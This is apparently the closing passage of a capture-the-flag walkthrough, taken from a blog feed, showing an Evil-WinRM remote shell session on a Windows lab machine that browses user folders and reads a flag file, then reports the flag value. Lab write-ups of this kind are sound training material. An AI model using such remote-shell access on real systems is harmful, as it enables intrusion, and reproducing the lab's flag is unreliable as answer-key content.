</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">d-----          3/9/2022   5:35 PM                Administrator
</span></span><span class="line"><span class="cl">d-----          3/9/2022   5:33 PM                mike
</span></span><span class="line"><span class="cl">d-r---        10/10/2020  12:37 PM                Public
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers&gt; <span class="nb">cd</span> mike
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ike
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">d-----         3/10/2022   4:51 AM                Desktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike&gt; <span class="nb">cd</span> Desktop
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">-a----         3/10/2022   4:50 AM             <span class="m">32</span> flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop&gt; cat flag.txt
</span></span><span class="line"><span class="cl">ea81b7afddd03efaa0945333ed147fac
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<hr>
<p><strong>root flag: ea81b7afddd03efaa0945333ed147fac</strong></p>
<hr>
<!-- raw HTML omitted -->
<p><strong>That&rsquo;s it!</strong></p>
<!-- raw HTML omitted -->
<p>Thanks for tuning in !</p>
]]></description></item></channel></rss>